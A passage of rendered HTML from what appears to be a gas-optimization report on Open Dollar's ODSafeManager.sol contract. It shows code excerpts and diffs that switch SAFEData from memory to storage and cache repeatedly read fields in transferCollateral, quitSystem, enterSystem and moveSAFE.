class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">169</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">SAFEData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">170</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">ISAFEEngine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeEngine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_wad</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">171</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TransferCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_wad</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">172</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function transferCollateral(uint256 _safe, address _dst, uint256 _wad) external safeAllowed(_safe) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    SAFEData memory _sData = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    SAFEData storage _sData = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ISAFEEngine(safeEngine).transferCollateral(_sData.collateralType, _sData.safeHandler, _dst, _wad);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     emit TransferCollateral(msg.sender, _safe, _dst, _wad);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<h3 id=\"odsafemanagersolquitsystem-use-storage-for-_sdata-and-cache-repeatedly-read-fields\" style=\"position:relative;\"><a href=\"#odsafemanagersolquitsystem-use-storage-for-_sdata-and-cache-repeatedly-read-fields\" aria-label=\"odsafemanagersolquitsystem use storage for _sdata and cache repeatedly read fields permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ODSafeManager.sol.quitSystem(): Use storage for <code>_sData</code> and cache repeatedly read fields</h3>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L189-L202\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L189-L202</a></p>\n<p><strong>The bot only suggested changing <code>_safeInfo</code></strong> - <code>We can actually optimize more</code> </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">189</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">quitSystem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">safeAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">) </span><span class=\"mtk11\">handlerAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">190</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">SAFEData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">191</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">ISAFEEngine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">SAFE</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ISAFEEngine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeEngine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">192</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_deltaCollateral</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lockedCollateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toInt</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">193</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_deltaDebt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">generatedDebt</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toInt</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">194</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">ISAFEEngine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeEngine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferSAFECollateralAndDebt</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">195</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaCollateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">196</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">198</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">// Remove safe from owner&#39;s list (notice it doesn&#39;t erase safe ownership)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">199</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_usrSafes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">].</span><span class=\"mtk11\">remove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">200</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_usrSafesPerCollat</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">].</span><span class=\"mtk11\">remove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">201</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">QuitSystem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">202</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function quitSystem(uint256 _safe, address _dst) external safeAllowed(_safe) handlerAllowed(_dst) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    SAFEData memory _sData = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    ISAFEEngine.SAFE memory _safeInfo = ISAFEEngine(safeEngine).safes(_sData.collateralType, _sData.safeHandler);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    SAFEData storage _sData = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    bytes32 _collateralType= _sData.collateralType;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address _safeHandler = _sData.safeHandler;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ISAFEEngine.SAFE memory _safeInfo = ISAFEEngine(safeEngine).safes(_collateralType, _safeHandler);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     int256 _deltaCollateral = _safeInfo.lockedCollateral.toInt();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     int256 _deltaDebt = _safeInfo.generatedDebt.toInt();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ISAFEEngine(safeEngine).transferSAFECollateralAndDebt(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      _sData.collateralType, _sData.safeHandler, _dst, _deltaCollateral, _deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _collateralType, _safeHandler, _dst, _deltaCollateral, _deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address _owner = _sData.owner;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // Remove safe from owner&#39;s list (notice it doesn&#39;t erase safe ownership)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    _usrSafes[_sData.owner].remove(_safe);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    _usrSafesPerCollat[_sData.owner][_sData.collateralType].remove(_safe);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    _usrSafes[_owner].remove(_safe);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    _usrSafesPerCollat[_owner][_collateralType].remove(_safe);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     emit QuitSystem(msg.sender, _safe, _dst);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<h3 id=\"odsafemanagersolentersystem-use-storage-for-_sdata-and-cache-repeatedly-read-fields\" style=\"position:relative;\"><a href=\"#odsafemanagersolentersystem-use-storage-for-_sdata-and-cache-repeatedly-read-fields\" aria-label=\"odsafemanagersolentersystem use storage for _sdata and cache repeatedly read fields permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ODSafeManager.sol.enterSystem(): Use storage for <code>_sData</code> and cache repeatedly read fields</h3>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L205-L214\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L205-L214</a></p>\n<p><strong>The bot only suggested changing <code>_safeInfo</code></strong> - <code>We can actually optimize more</code> </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">205</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">enterSystem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_src</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">handlerAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_src</span><span class=\"mtk1\">) </span><span class=\"mtk11\">safeAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">206</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">SAFEData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">207</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">ISAFEEngine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">SAFE</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ISAFEEngine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeEngine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">208</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_deltaCollateral</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lockedCollateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toInt</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">209</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_deltaDebt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">generatedDebt</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toInt</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">210</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">ISAFEEngine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeEngine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferSAFECollateralAndDebt</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">211</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_src</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaCollateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">212</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">213</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">EnterSystem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_src</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">214</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"92\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function enterSystem(address _src, uint256 _safe) external handlerAllowed(_src) safeAllowed(_safe) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    SAFEData memory _sData = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    ISAFEEngine.SAFE memory _safeInfo = ISAFEEngine(safeEngine).safes(_sData.collateralType, _sData.safeHandler);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    SAFEData storage _sData = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    bytes32 _collateralType = _sData.collateralType;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address _safeHandler = _sData.safeHandler;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ISAFEEngine.SAFE memory _safeInfo = ISAFEEngine(safeEngine).safes(_collateralType, _safeHandler);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     int256 _deltaCollateral = _safeInfo.lockedCollateral.toInt();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     int256 _deltaDebt = _safeInfo.generatedDebt.toInt();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ISAFEEngine(safeEngine).transferSAFECollateralAndDebt(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      _sData.collateralType, _src, _sData.safeHandler, _deltaCollateral, _deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _collateralType, _src, _safeHandler, _deltaCollateral, _deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     emit EnterSystem(msg.sender, _src, _safe);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<h3 id=\"odsafemanagersolmovesafe-use-storage-for-_srcdata_dstdata-and-cache-repeatedly-read-fields\" style=\"position:relative;\"><a href=\"#odsafemanagersolmovesafe-use-storage-for-_srcdata_dstdata-and-cache-repeatedly-read-fields\" aria-label=\"odsafemanagersolmovesafe use storage for _srcdata_dstdata and cache repeatedly read fields permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ODSafeManager.sol.moveSAFE(): Use storage for <code>_srcData,_dstData</code> and cache repeatedly read fields</h3>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L217-L232\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L217-L232</a></p>\n<p><strong>The bot only suggested changing <code>_safeInfo</code></strong> - <code>We can actually optimize more</code> </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"93\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">217</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">moveSAFE</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeSrc</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeDst</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">safeAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeSrc</span><span class=\"mtk1\">) </span><span class=\"mtk11\">safeAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeDst</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">218</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">SAFEData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_srcData</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safeSrc</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">219</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">SAFEData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_dstData</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safeDst</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">220</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_srcData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_dstData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CollateralTypesMismatch</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">221</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">ISAFEEngine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">SAFE</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ISAFEEngine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeEngine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_srcData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_srcData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">222</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_deltaCollateral</span><span class=\"mtk1\"> = </span><span 